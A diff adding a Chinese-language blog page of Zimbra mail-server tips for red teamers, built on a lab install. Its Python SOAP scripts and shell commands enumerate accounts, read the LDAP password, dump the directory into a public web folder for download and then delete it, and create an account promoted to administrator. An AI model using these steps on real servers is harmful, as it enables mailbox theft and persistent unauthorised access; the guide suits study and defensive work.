@@ -1,0 +1,727 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="b11c">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="​                                                                                《  Zimbra邮件服务器的实战使用Tips  》  一.前言 总结以前对zimbras邮件服务器系统模拟实战学习的记录，最终目的：能够对Zimbra邮件服务器的资源进行访问和修改，便利实战下的 red team Player。 二.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Zimbra邮件服务器的实战使用Tips">
+<meta property="og:url" content="https://b11c.github.io/2023/06/08/zimbra-1/index.html">
+<meta property="og:site_name" content="b11c">
+<meta property="og:description" content="​                                                                                《  Zimbra邮件服务器的实战使用Tips  》  一.前言 总结以前对zimbras邮件服务器系统模拟实战学习的记录，最终目的：能够对Zimbra邮件服务器的资源进行访问和修改，便利实战下的 red team Player。 二.">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/1.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/2.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/3.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/4.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/5.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/6.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/7.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/8.png">
+<meta property="og:image" content="https://b11c.github.io/2023/06/08/zimbra-1/9.png">
+<meta property="article:published_time" content="2023-06-08T12:10:56.000Z">
+<meta property="article:modified_time" content="2023-06-08T12:25:15.279Z">
+<meta property="article:author" content="b11c">
+<meta property="article:tag" content="Tips">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://b11c.github.io/2023/06/08/zimbra-1/1.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Zimbra邮件服务器的实战使用Tips - b11c</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"b11c.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"left","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>b11c</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Zimbra邮件服务器的实战使用Tips"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        b11c
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-06-08 20:10" pubdate>
+          June 8, 2023 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.7k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          48 mins
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span>次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="padding-left: 2rem; margin-right: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">Zimbra邮件服务器的实战使用Tips</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<p>​                                                                                <strong>《  Zimbra邮件服务器的实战使用Tips  》</strong></p>
+<hr>
+<h2 id="一-前言"><a href="#一-前言" class="headerlink" title="一.前言"></a>一.前言</h2><p> 总结以前对zimbras邮件服务器系统模拟实战学习的记录，最终目的：能够对Zimbra邮件服务器的资源进行访问和修改，便利实战下的 red team Player。</p>
+<h2 id="二-环境"><a href="#二-环境" class="headerlink" title="二.环境"></a>二.环境</h2><ol>
+<li>ubuntu-14.04.6-desktop</li>
+<li>zimbra 8.6 (高版本也可以)</li>
+</ol>
+<h2 id="三-实战下的利用"><a href="#三-实战下的利用" class="headerlink" title="三.实战下的利用"></a>三.实战下的利用</h2><h3 id="1-搭建环境"><a href="#1-搭建环境" class="headerlink" title="1.搭建环境"></a>1.搭建环境</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs awk">只提供安装的命令行语句：<br><br>ubuntu安装：<br>ubuntu的ISO下载： https:<span class="hljs-regexp">//</span>releases.ubuntu.com<span class="hljs-regexp">/14.04/</span>（ps：内存尽量多给<span class="hljs-number">50</span>g、运行内存、处理器给高）<br><br>apt-get install libgmp10 libperl5.<span class="hljs-number">18</span> unzip pax sysstat sqlite3 dnsmasq wget<br><br><br>vim <span class="hljs-regexp">/etc/</span>hostname<br>mail.test.com<br>或者直接：<br>sudo hostnamectl set-hostname mail.test.com<br><br>vim <span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span>（ubuntu本机ip）  mail.test.com   mail<br><br>vim <span class="hljs-regexp">/etc/</span>dnsmasq.conf<br>server=<span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span><br>domain=test.com<br>mx-host=test.com, mail.test.com, <span class="hljs-number">5</span><br>mx-host=mail.test.com, mail.test.com, <span class="hljs-number">5</span><br>listen-address=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><br><br>sudo reboot<br><br>zimbra安装：<br>wget https:<span class="hljs-regexp">//</span>files.zimbra.com<span class="hljs-regexp">/downloads/</span><span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA/zcs-<span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA_1153.UBUNTU14_64.<span class="hljs-number">20141215151116</span>.tgz<br>tar -xvf zcs-<span class="hljs-number">8.6</span>.<span class="hljs-number">0</span>_GA_1153.UBUNTU14_64.<span class="hljs-number">20141215151116</span>.tgz<br><br>wget http:<span class="hljs-regexp">//</span>th.archive.ubuntu.com<span class="hljs-regexp">/ubuntu/</span>pool<span class="hljs-regexp">/universe/g</span><span class="hljs-regexp">/gmp4/</span>libgmp3c2_4.<span class="hljs-number">3.2</span>+dfsg-<span class="hljs-number">2</span>ubuntu1_amd64.deb<br>dpkg -i libgmp3c2_4.<span class="hljs-number">3.2</span>+dfsg-<span class="hljs-number">2</span>ubuntu1_amd64.deb<br><br>sudo ./install.sh  Y zimbra-dnscache:N<br><span class="hljs-number">6</span><br><span class="hljs-number">4</span>   <span class="hljs-regexp">//</span>设置密码<br>a<br>yes<br><br>su - zimbra         <span class="hljs-regexp">//</span>切换用户<br>zmcontrol status   <span class="hljs-regexp">//</span>查看zimbra服务器状态<br><br>https:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">53.145</span>:<span class="hljs-number">7071</span>/zimbraAdmin<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-实战中zimbra的tips"><a href="#2-实战中zimbra的tips" class="headerlink" title="2.实战中zimbra的tips"></a>2.实战中zimbra的tips</h3><h4 id="A-zimbra的基本简介："><a href="#A-zimbra的基本简介：" class="headerlink" title="A.zimbra的基本简介："></a>A.zimbra的基本简介：</h4><h5 id="（1）Zimbra-SOAP-API的名称："><a href="#（1）Zimbra-SOAP-API的名称：" class="headerlink" title="（1）Zimbra SOAP API的名称："></a>（1）Zimbra SOAP API的名称：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">zimbraAdmin    <span class="hljs-regexp">//</span>管理接口，是管理员权限<br>zimbraAccount  <span class="hljs-regexp">//</span>zimbra用户操作<br>zimbraMail     <span class="hljs-regexp">//</span>zimbra邮箱操作<br>zimbraAdminExt<br>zimbraRepl<br>zimbraSync<br>zimbraVoice<br><br>实战下常使用的的命名空间有三个：<br>zimbraAdmin     <span class="hljs-regexp">//</span>Zimbra邮件服务器的管理接口，需要管理员权限<br>zimbraAccount   <span class="hljs-regexp">//</span>同Zimbra用户相关的操作<br>zimbraMail      <span class="hljs-regexp">//</span>同zimbra邮件的操作<br></code></pre></td></tr></table></figure>
+
+<h5 id="（2）默认开放的端口有三种："><a href="#（2）默认开放的端口有三种：" class="headerlink" title="（2）默认开放的端口有三种："></a>（2）默认开放的端口有三种：</h5><p>A. 访问邮件：(80或443端口)</p>
+<blockquote>
+<p>对应的地址为：</p>
+<p><a target="_blank" rel="noopener" href="https://192.168.53.145/service/soap">https://192.168.53.145/service/soap</a></p>
+<p><a target="_blank" rel="noopener" href="http://192.168.53.145/service/soap">http://192.168.53.145/service/soap</a></p>
+</blockquote>
+<p>B.管理面板：（7071端口）</p>
+<blockquote>
+<p>对应的地址为：<a target="_blank" rel="noopener" href="https://192.168.53.145:7071/service/admin/soap">https://192.168.53.145:7071/service/admin/soap</a></p>
+</blockquote>
+<p>C.管理面板-&gt;访问邮件：（8443端口）</p>
+<blockquote>
+<p>从管理面板能够读取所有用户的邮件;</p>
+<p>对应的地址为：<a target="_blank" rel="noopener" href="https://192.168.53.145:8443/mail?adminPreAuth=1">https://192.168.53.145:8443/mail?adminPreAuth=1</a></p>
+</blockquote>
+<h4 id="B-python脚本对zimbra操作"><a href="#B-python脚本对zimbra操作" class="headerlink" title="B.python脚本对zimbra操作"></a>B.python脚本对zimbra操作</h4><p>实战中，目标可能存在zimbra邮件服务器系统，我们拿下windows的域控后，可能要横向拿邮服上的数据，扩大战果；或者是我们web打点，zimbra用户存在弱口令，拿到某某的账号和密码，就可以进行一些如下操作。</p>
+<h5 id="1-普通用户登录（账号和密码）"><a href="#1-普通用户登录（账号和密码）" class="headerlink" title="1.普通用户登录（账号和密码）"></a>1.普通用户登录（账号和密码）</h5><p>对应的地址为：<a target="_blank" rel="noopener" href="https://192.168.53.145/service/soap">https://192.168.53.145/service/soap</a></p>
+<p>获得发件箱邮件数量的例代码：</p>
+<p>PS：首次运行Get-ZimbraAccount.py ，需要安装 pip install python-zimbra模块。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Get-ZimbraAccount.py</span><br><span class="hljs-keyword">import</span> pythonzimbra.communication<br><span class="hljs-keyword">from</span> pythonzimbra.communication <span class="hljs-keyword">import</span> Communication<br><span class="hljs-keyword">import</span> pythonzimbra.tools<br><span class="hljs-keyword">from</span> pythonzimbra.tools <span class="hljs-keyword">import</span> auth<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment">#对于自己的测试环境，需要忽略SSL证书验证</span><br><span class="hljs-keyword">import</span> ssl<br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-comment">#url  = &#x27;url+/service/soap&#x27;</span><br><span class="hljs-comment">#普通用户登录的对应链接</span><br>url  = <span class="hljs-string">&#x27;https://192.168.53.145/service/soap&#x27;</span><br>comm = Communication(url)<br><br><span class="hljs-comment">#使用用户名和口令登录的示例代码如下：</span><br>token = auth.authenticate(<br>    url,<br>    <br>	<span class="hljs-comment">#普通用户账号</span><br>    <span class="hljs-string">&#x27;test123&#x27;</span>,<br>	<br>	<span class="hljs-comment">#普通用户的密码</span><br>    <span class="hljs-string">&#x27;test123..&#x27;</span>,<br>    use_password=<span class="hljs-literal">True</span>,<br>)<br>info_request = comm.gen_request(token=token)<br>info_request.add_request(<br>    <span class="hljs-string">&quot;GetFolderRequest&quot;</span>,<br>    &#123;<br>        <span class="hljs-string">&quot;folder&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;path&quot;</span>: <span class="hljs-string">&quot;/sent&quot;</span><br>        &#125;<br>    &#125;,<br>    <span class="hljs-string">&quot;urn:zimbraMail&quot;</span><br>)<br>info_response = comm.send_request(info_request)<br><span class="hljs-built_in">print</span>(info_response.get_response())<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info_response.is_fault():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;size:%s&quot;</span>%info_response.get_response()[<span class="hljs-string">&#x27;GetFolderResponse&#x27;</span>][<span class="hljs-string">&#x27;folder&#x27;</span>][<span class="hljs-string">&#x27;n&#x27;</span>]),<br></code></pre></td></tr></table></figure>
+
+<p>结果：</p>
+ <img src="/2023/06/08/zimbra-1/1.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<p>分析：size：是用户发送了多少篇邮件，此处是搭建的环境，发送了一篇，故size为1。</p>
+<h5 id="2-管理员登录（账号和密码）"><a href="#2-管理员登录（账号和密码）" class="headerlink" title="2.管理员登录（账号和密码）"></a>2.管理员登录（账号和密码）</h5><p>对应的地址为：<a target="_blank" rel="noopener" href="https://192.168.53.145:7071/service/admin/soap">https://192.168.53.145:7071/service/admin/soap</a></p>
+<p>获得所有邮件用户信息：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#Get-ZimbraAdmin.py</span><br><span class="hljs-keyword">import</span> pythonzimbra.communication<br><span class="hljs-keyword">from</span> pythonzimbra.communication <span class="hljs-keyword">import</span> Communication<br><span class="hljs-keyword">import</span> pythonzimbra.tools<br><span class="hljs-keyword">from</span> pythonzimbra.tools <span class="hljs-keyword">import</span> auth<br><span class="hljs-keyword">import</span> warnings<br>warnings.filterwarnings(<span class="hljs-string">&quot;ignore&quot;</span>)<br><br><span class="hljs-comment">#对于自己的测试环境，需要忽略SSL证书验证</span><br><span class="hljs-keyword">import</span> ssl<br>ssl._create_default_https_context = ssl._create_unverified_context<br><br><span class="hljs-comment">#url = url+/service/admin/soap</span><br><span class="hljs-comment">#管理员登录的对应链接</span><br>url  = <span class="hljs-string">&#x27;https://192.168.53.145:7071/service/admin/soap&#x27;</span><br>comm = Communication(url)<br><br><span class="hljs-comment">#使用preauth-key登录</span><br>token = auth.authenticate(<br>    url,<br>    <br>    <span class="hljs-comment">#管理员的账号</span><br>    <span class="hljs-string">&#x27;admin&#x27;</span>,<br>    <span class="hljs-comment">#管理员的密码</span><br>    <span class="hljs-string">&#x27;akali123456&#x27;</span>,<br>    use_password=<span class="hljs-literal">True</span>,<br>    admin_auth=<span class="hljs-literal">True</span>, <br>)<br><br><br>info_request = comm.gen_request(token=token)<br>info_request.add_request(<br>    <span class="hljs-string">&quot;GetAllAccountsRequest&quot;</span>,<br>    &#123;<br>        <br>    &#125;,<br>    <span class="hljs-string">&quot;urn:zimbraAdmin&quot;</span><br>)<br>info_response = comm.send_request(info_request)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> info_response.is_fault():<br>    <span class="hljs-built_in">print</span>(info_response.get_response()[<span class="hljs-string">&#x27;GetAllAccountsResponse&#x27;</span>]),<br></code></pre></td></tr></table></figure>
+
+<p>结果：</p>
+ <img src="/2023/06/08/zimbra-1/2.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h4 id="C-实战常用命令"><a href="#C-实战常用命令" class="headerlink" title="C.实战常用命令"></a>C.实战常用命令</h4><h5 id="1-列举所有用户："><a href="#1-列举所有用户：" class="headerlink" title="1.列举所有用户："></a>1.列举所有用户：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov -l gaa<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/3.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="2-列举管理员："><a href="#2-列举管理员：" class="headerlink" title="2.列举管理员："></a>2.列举管理员：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov -l gaaa<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/4.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="3-查询服务器邮箱使用情况："><a href="#3-查询服务器邮箱使用情况：" class="headerlink" title="3.查询服务器邮箱使用情况："></a>3.查询服务器邮箱使用情况：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov gqu mail.test.com<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/5.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="4-获取ldap密码："><a href="#4-获取ldap密码：" class="headerlink" title="4.获取ldap密码："></a>4.获取ldap密码：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmlocalconfig -s |<span class="hljs-keyword">grep</span> zimbra_ldap<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/6.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="5-获取ldap服务器地址："><a href="#5-获取ldap服务器地址：" class="headerlink" title="5.获取ldap服务器地址："></a>5.获取ldap服务器地址：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmlocalconfig -s | <span class="hljs-keyword">grep</span> ldap_url<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/7.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="6-zimbra-web路径："><a href="#6-zimbra-web路径：" class="headerlink" title="6.zimbra web路径："></a>6.zimbra web路径：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/public/</span><br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/8.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="7-导出ldap（需要ldap密码和ldap服务器地址）："><a href="#7-导出ldap（需要ldap密码和ldap服务器地址）：" class="headerlink" title="7.导出ldap（需要ldap密码和ldap服务器地址）："></a>7.导出ldap（需要ldap密码和ldap服务器地址）：</h5><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/common/</span>bin<span class="hljs-regexp">/ldapsearch -x -H  ldap:/</span><span class="hljs-regexp">/mail.test.com:389 -D &quot;uid=zimbra,cn=admins,cn=zimbra&quot; -w u2rCl9JN6_ &gt; /</span>opt<span class="hljs-regexp">/zimbra/</span>jetty<span class="hljs-regexp">/webapps/</span>zimbra<span class="hljs-regexp">/public/</span>jsp/ldap.tar<br><br>文件拖回来后删除导出的压缩包:<br>rm -f <span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/jetty/</span>webapps<span class="hljs-regexp">/zimbra/</span><span class="hljs-keyword">public</span><span class="hljs-regexp">/jsp/</span>ldap.tar<br></code></pre></td></tr></table></figure>
+
+ <img src="/2023/06/08/zimbra-1/9.png" srcset="/img/loading.gif" lazyload class="" title="This is an example image">
+
+<h5 id="8-新建用户-并提升用户至管理员-："><a href="#8-新建用户-并提升用户至管理员-：" class="headerlink" title="8.新建用户(并提升用户至管理员)："></a>8.新建用户(并提升用户至管理员)：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov ca test123@mail.test.com test123..                    <span class="hljs-regexp">//</span>新建用户<br><span class="hljs-regexp">/opt/</span>zimbra<span class="hljs-regexp">/bin/</span>zmprov ma test123@mail.test.com zimbraIsAdminAccount TRUE    <span class="hljs-regexp">//</span>提升为管理员<br></code></pre></td></tr></table></figure>
+
